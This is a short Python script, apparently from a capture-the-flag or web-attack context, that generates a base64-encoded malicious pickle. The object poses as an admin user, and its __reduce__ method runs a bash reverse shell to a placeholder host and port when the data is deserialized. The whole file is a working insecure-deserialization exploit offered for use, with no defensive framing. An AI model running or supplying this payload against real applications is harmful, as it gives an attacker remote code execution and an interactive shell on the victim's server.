import pickle
from base64 import b64encode
import os

User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 1,
    '__repr__': lambda o: o.uname,
    '__reduce__': lambda o: (os.system, ("bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'",))

})
u = pickle.dumps(User())
print(b64encode(u).decode())
